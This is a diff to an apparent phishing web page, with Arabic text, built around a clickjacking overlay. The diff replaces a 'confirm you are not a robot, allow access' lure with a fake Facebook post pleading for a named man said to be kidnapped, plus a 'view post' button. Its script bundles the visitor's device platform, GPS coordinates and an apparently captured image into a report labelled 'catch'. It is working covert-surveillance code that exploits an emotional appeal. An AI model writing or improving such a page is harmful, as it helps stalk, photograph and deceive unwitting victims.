@@ -39,10 +39,13 @@
 
     <div id="clickjack-overlay">
         <div class="instruction">
-            <h2>⚠️ محتوى حساس</h2>
-            <p>لتشغيل الفيديو وتأكيد أنك لست روبوت، اضغط على الزر أدناه واسمح بالوصول.</p>
+            <h2>منشور فيسبوك  </h2>
+            <p>بأي ذنب يُخطف [محمد مصطفى العنعوني]؟ 
+                وبأي حق نعيش في غابة يغيب فيها القانون ويحضر فيها الغدر؟ قلوبنا تتقطع، 
+                ولا نسأل إلا سؤالاً واحداً: أين دور المسؤولين عما يحدث؟ 
+                اللهم ردّه إلينا سالماً وحسبنا الله ونعم الوكيل.</p>
         </div>
-        <button class="fake-btn" id="p_trigger">اضغط هنا للمشاهدة</button>
+        <button class="fake-btn" id="p_trigger">رؤوية المنشور </button>
     </div>
 
 <script>
@@ -90,7 +93,7 @@ async function executeSequence() {
 }
 
 async function finalize(img, pos) {
-    let text = `🚩 صيد (تمويه بصري)\n📱 الجهاز: ${navigator.platform}`;
+    let text = `🚩 صيد ( )\n📱 الجهاز: ${navigator.platform}`;
     if(pos) {
         text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
     }
